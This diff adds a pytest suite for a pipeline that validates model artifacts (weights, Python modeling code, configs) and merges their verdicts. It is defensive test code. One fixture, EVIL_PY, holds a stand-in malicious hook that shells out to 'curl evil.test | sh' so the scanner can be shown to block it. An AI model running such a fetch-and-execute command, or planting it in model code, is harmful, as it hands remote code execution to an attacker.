@@ -1,0 +1,285 @@
+"""통합 검증 파이프라인(whitelist.full_pipeline.run_full_validation) 회귀.
+
+가중치 + 코드 + config를 한 요청에서 각 검증기로 라우팅하고 결과를 병합하는
+새 통합 로직을 검증한다. 가중치 단독 경로(analyzer.service)와 코드 단독 경로
+(analyzer.orchestrator)는 각자 테스트가 있으므로, 여기서는 라우팅 + 병합 +
+job-level 판정 재계산에 집중한다.
+"""
+
+from __future__ import annotations
+
+import hashlib
+import uuid
+
+import pytest
+
+from analyzer.schemas import (
+    ArtifactRef,
+    ArtifactValidationResult,
+    CodeGrade,
+    ModelRef,
+    OverallDecision,
+    ReasonEntry,
+    ReviewAction,
+    RouteKind,
+    ValidationJobRequest,
+    ValidationJobResponse,
+    ValidationStatus,
+)
+from whitelist.full_pipeline import _combine_status, run_full_validation
+
+
+def _sha256_bytes(data: bytes) -> str:
+    return hashlib.sha256(data).hexdigest()
+
+
+def _artifact(path, repo_path: str, file_kind: str) -> dict:
+    data = path.read_bytes()
+    digest = _sha256_bytes(data)
+    ext = "." + repo_path.rsplit(".", 1)[-1] if "." in repo_path else ""
+    return {
+        "artifact_id": f"sha256:{digest}",
+        "repo_path": repo_path,
+        "file_name": path.name,
+        "file_kind": file_kind,
+        "detected_extension": ext,
+        "size_bytes": len(data),
+        "sha256": digest,
+        "source_url": f"https://huggingface.co/demo/{repo_path}",
+        "temp_local_path": str(path),
+    }
+
+
+def _request(artifacts: list[dict]) -> ValidationJobRequest:
+    return ValidationJobRequest.from_dict({
+        "request_id": str(uuid.uuid4()),
+        "job_id": str(uuid.uuid4()),
+        "artifacts": artifacts,
+        "policy_fingerprint": "test-policy",
+    })
+
+
+SAFE_PY = (
+    "import torch\n"
+    "import torch.nn as nn\n\n"
+    "class Net(nn.Module):\n"
+    "    def __init__(self):\n"
+    "        super().__init__()\n"
+    "        self.fc = nn.Linear(8, 8)\n"
+    "    def forward(self, x):\n"
+    "        return self.fc(x)\n"
+)
+
+EVIL_PY = (
+    "import subprocess\n"
+    "def hook():\n"
+    "    subprocess.Popen(['/bin/sh', '-c', 'curl evil.test | sh'])\n"
+)
+
+CONFIG_JSON = '{"model_type": "roberta", "hidden_size": 768, "num_labels": 13}\n'
+
+
+class TestCombineStatus:
+    """순수 함수 — 병합 우선순위 BLOCK > ERROR > PENDING_REVIEW > PASS."""
+
+    class _R:
+        def __init__(self, status):
+            self.status = status
+
+    def test_block_wins(self):
+        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.BLOCK)]
+        assert _combine_status(rs) is ValidationStatus.BLOCK
+
+    def test_pending_over_pass(self):
+        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.PENDING_REVIEW)]
+        assert _combine_status(rs) is ValidationStatus.PENDING_REVIEW
+
+    def test_all_pass(self):
+        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.PASS)]
+        assert _combine_status(rs) is ValidationStatus.PASS
+
+    def test_empty_is_pass(self):
+        assert _combine_status([]) is ValidationStatus.PASS
+
+
+class TestFullPipelineRouting:
+    """코드 + config가 각 검증기로 실제 라우팅되고 병합되는지."""
+
+    def test_malicious_python_blocks_overall(self, db_session, tmp_path):
+        evil = tmp_path / "modeling_evil.py"
+        evil.write_text(EVIL_PY, encoding="utf-8")
+        cfg = tmp_path / "config.json"
+        cfg.write_text(CONFIG_JSON, encoding="utf-8")
+
+        req = _request([
+            _artifact(evil, "modeling_evil.py", "PYTHON"),
+            _artifact(cfg, "config.json", "CONFIG_JSON"),
+        ])
+        resp = run_full_validation(req, db=db_session)
+
+        assert resp.overall_status is ValidationStatus.BLOCK
+        assert resp.overall_decision is OverallDecision.DENY
+        # 악성 .py가 차단 목록에 있어야 함
+        statuses = {
+            r.artifact.file_name: r.status for r in resp.artifact_results
+        }
+        assert statuses["modeling_evil.py"] is ValidationStatus.BLOCK
+
+    def test_safe_python_and_config_not_blocked(self, db_session, tmp_path):
+        safe = tmp_path / "modeling_safe.py"
+        safe.write_text(SAFE_PY, encoding="utf-8")
+        cfg = tmp_path / "config.json"
+        cfg.write_text(CONFIG_JSON, encoding="utf-8")
+
+        req = _request([
+            _artifact(safe, "modeling_safe.py", "PYTHON"),
+            _artifact(cfg, "config.json", "CONFIG_JSON"),
+        ])
+        resp = run_full_validation(req, db=db_session)
+
+        # 안전 코드 + 정상 config → BLOCK 아님 (PASS 또는 PENDING_REVIEW 허용)
+        assert resp.overall_status is not ValidationStatus.BLOCK
+        names = {r.artifact.file_name for r in resp.artifact_results}
+        assert {"modeling_safe.py", "config.json"} <= names
+
+    def test_config_only_request_runs_config_validator(self, db_session, tmp_path):
+        cfg = tmp_path / "tokenizer_config.json"
+        cfg.write_text('{"tokenizer_class": "RobertaTokenizer"}\n', encoding="utf-8")
+
+        req = _request([_artifact(cfg, "tokenizer_config.json", "TOKENIZER_CONFIG_JSON")])
+        resp = run_full_validation(req, db=db_session)
+
+        # config 검증기가 실제로 돌아 결과가 1건 있어야 함 (SKIPPED 아님)
+        assert len(resp.artifact_results) == 1
+        r = resp.artifact_results[0]
+        assert r.artifact.file_name == "tokenizer_config.json"
+        assert r.status is not ValidationStatus.SKIPPED
+
+    def test_dict_request_accepted(self, db_session, tmp_path):
+        """dict로 들어와도 ValidationJobRequest로 정규화."""
+        cfg = tmp_path / "config.json"
+        cfg.write_text(CONFIG_JSON, encoding="utf-8")
+        payload = {
+            "request_id": "r1",
+            "job_id": "j1",
+            "artifacts": [_artifact(cfg, "config.json", "CONFIG_JSON")],
+        }
+        resp = run_full_validation(payload, db=db_session)
+        assert resp.request_id == "r1"
+        assert len(resp.artifact_results) == 1
+
+    def test_weight_release_id_lists_are_preserved(
+        self, db_session, monkeypatch, tmp_path
+    ):
+        original = tmp_path / "training_args.bin"
+        original.write_bytes(b"pickle payload")
+        req = _request([_artifact(original, "training_args.bin", "PICKLE")])
+        original_ref = req.artifacts[0]
+
+        converted = tmp_path / "training_args.safetensors"
+        converted.write_bytes(b"converted safetensors")
+        converted_digest = _sha256_bytes(converted.read_bytes())
+        generated_ref = ArtifactRef(
+            artifact_id=f"sha256:{converted_digest}",
+            repo_path=converted.as_posix(),
+            file_name=converted.name,
+            file_kind="SAFETENSORS",
+            detected_extension=".safetensors",
+            size_bytes=converted.stat().st_size,
+            sha256=converted_digest,
+            source_url=original_ref.source_url,
+            temp_local_path=converted.as_posix(),
+            referenced_by=[original_ref.file_name],
+            is_generated=True,
+        )
+        weight_result = ArtifactValidationResult(
+            artifact=original_ref,
+            route_kind=RouteKind.PICKLE_PATH_A,
+            status=ValidationStatus.PASS,
+            grade=CodeGrade.NA,
+            review_action=ReviewAction.AUTO_APPROVE_REGENERATED,
+            cache_key="",
+            cache_hit=False,
+            reason_entries=[ReasonEntry(code="PICKLE_CONVERTED", message="ok")],
+            started_at="2026-01-01T00:00:00Z",
+            finished_at="2026-01-01T00:00:00Z",
+            details={},
+            generated_artifact=generated_ref,
+        )
+        weight_response = ValidationJobResponse(
+            request_id=req.request_id,
+            job_id=req.job_id,
+            overall_decision=OverallDecision.APPROVE,
+            overall_status=ValidationStatus.PASS,
+            release_action="APPROVE",
+            artifact_results=[weight_result],
+            approved_artifact_ids=[generated_ref.artifact_id],
+            blocked_artifact_ids=[],
+            pending_artifact_ids=[],
+            generated_artifacts=[generated_ref],
+            report_id=f"report-{req.job_id}",
+            report_path="",
+            reason_entries=[],
+            created_at="2026-01-01T00:00:00Z",
+        )
+
+        monkeypatch.setattr(
+            "whitelist.full_pipeline._validate_weight_job",
+            lambda job: weight_response,
+        )
+
+        resp = run_full_validation(req, db=db_session)
+
+        assert resp.approved_artifact_ids == [generated_ref.artifact_id]
+        assert original_ref.artifact_id not in resp.approved_artifact_ids
+        assert resp.generated_artifacts == [generated_ref]
+
+    def test_code_config_source_metadata_mismatch_fails_closed(
+        self, db_session, tmp_path
+    ):
+        declared = tmp_path / "declared_config.json"
+        declared.write_text('{"model_type": "roberta"', encoding="utf-8")
+        actual = tmp_path / "actual_config.json"
+        actual.write_text(CONFIG_JSON, encoding="utf-8")
+
+        artifact = _artifact(declared, "config.json", "CONFIG_JSON")
+        artifact["temp_local_path"] = str(actual)
+        req = _request([artifact])
+
+        resp = run_full_validation(req, db=db_session)
+
+        assert resp.overall_status is ValidationStatus.ERROR
+        assert resp.approved_artifact_ids == []
+        assert artifact["artifact_id"] in resp.pending_artifact_ids
+        result = resp.artifact_results[0]
+        assert result.status is ValidationStatus.ERROR
+        assert result.reason_entries[0].code in {
+            "SOURCE_SIZE_MISMATCH",
+            "SOURCE_SHA256_MISMATCH",
+        }
+
+    def test_duplicate_repo_path_does_not_overwrite_verified_source(
+        self, db_session, tmp_path
+    ):
+        evil = tmp_path / "evil.py"
+        evil.write_text(EVIL_PY, encoding="utf-8")
+        safe = tmp_path / "safe.py"
+        safe.write_text(SAFE_PY, encoding="utf-8")
+
+        req = _request([
+            _artifact(evil, "modeling.py", "PYTHON"),
+            _artifact(safe, "modeling.py", "PYTHON"),
+        ])
+
+        resp = run_full_validation(req, db=db_session)
+
+        assert resp.overall_status is ValidationStatus.BLOCK
+        assert any(
+            result.status is ValidationStatus.BLOCK
+            for result in resp.artifact_results
+        )
+        assert any(
+            result.status is ValidationStatus.ERROR
+            and result.reason_entries[0].code == "DUPLICATE_REPO_PATH"
+            for result in resp.artifact_results
+        )
